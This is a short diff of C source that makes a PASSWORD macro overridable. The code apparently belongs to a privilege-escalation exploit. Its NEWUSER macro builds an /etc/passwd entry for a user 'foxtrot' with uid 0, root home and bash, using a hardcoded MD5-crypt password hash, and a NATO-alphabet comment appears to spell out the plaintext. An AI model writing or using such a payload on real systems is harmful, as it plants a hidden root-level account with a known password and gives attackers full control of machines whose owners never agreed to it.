@@ -8,8 +8,10 @@
  #define USER "foxtrot:"
 #endif
 
-// bravo oscar sierra tango alfa
-#define PASSWORD "$1$x0x0x0x0$1JGD.YYakC1aVB1BVo9o1/"
+#ifndef PASSWORD
+ // bravo oscar sierra tango alfa
+ #define PASSWORD "$1$x0x0x0x0$1JGD.YYakC1aVB1BVo9o1/"
+#endif
 
 #define NEWUSER USER PASSWORD ":0:0::/root:/bin/bash\n"
 
